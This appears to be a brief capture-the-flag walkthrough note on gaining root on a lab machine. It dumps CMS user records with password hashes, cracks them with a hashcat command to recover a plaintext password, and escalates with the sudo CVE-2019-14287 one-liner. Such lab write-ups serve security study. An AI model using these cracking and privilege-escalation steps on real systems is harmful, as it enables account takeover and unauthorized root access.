# Getting Root

![[Pasted image 20211212143156.png]]

```bash
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
```


![[Pasted image 20211212143718.png]]

```bash
"admin": {                           
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
```
```bash
"fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00
```

Hashes
```
Hugo:faca404fd5c0a31cf1897b823c695c85cffeb98d
Admin:bfcc887f62e36ea019e3295aafb8a3885966e265
fergus:be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7
```

```bash
hashcat --username -m 100 hashes /usr/wordlists/rockyou.txt -r rules/best64.rule
```

![[Pasted image 20211212144531.png]]
hugo:Password120

Underflow exploit - Underflow !root | CVE-2019-14287
![[Pasted image 20211212145443.png]]

```bash
sudo -u#-1 bash
```

![[Pasted image 20211212145702.png]]
